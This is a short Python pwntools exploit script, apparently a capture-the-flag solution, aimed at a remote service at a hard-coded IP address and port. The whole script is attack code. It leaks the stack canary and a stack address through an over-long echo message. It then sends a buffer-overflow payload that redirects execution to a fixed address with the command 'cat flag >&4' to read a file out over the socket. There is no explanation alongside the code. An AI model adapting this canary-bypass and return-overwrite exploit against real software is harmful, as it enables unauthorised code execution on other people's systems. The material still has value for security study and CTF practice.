from pwn import *

import binascii


def wait_menu(menu):
    p.recvuntil('Select menu > ')
    p.sendline(str(menu))


def echo(msg):
    wait_menu(1)
    p.recvuntil('Message : ')
    p.send(msg)

if 0:
    ADDR = 'localhost'
    PORT = 12345
else:
    ADDR = '110.10.212.130'
    PORT = 8888


p = remote(ADDR, PORT)

echo('a'*41)
p.recvn(41)
canary = '\x00' + p.recvn(3)
log.success('Canary: {}'.format(binascii.hexlify(canary)))

p.close()


p = remote(ADDR, PORT)

echo('a'*52)
p.recvn(52)
stack_leak = u32(p.recvn(4))
log.success('Addr: {:#x}'.format(stack_leak))

p.close()


p = remote(ADDR, PORT)

cmd = 'cat flag >&4\x00'

echo('a'*40 + canary + 'a'*12 + p32(0x08048620) + 'a'*4 + p32(stack_leak-372+68) + cmd)
wait_menu(3)

p.interactive()
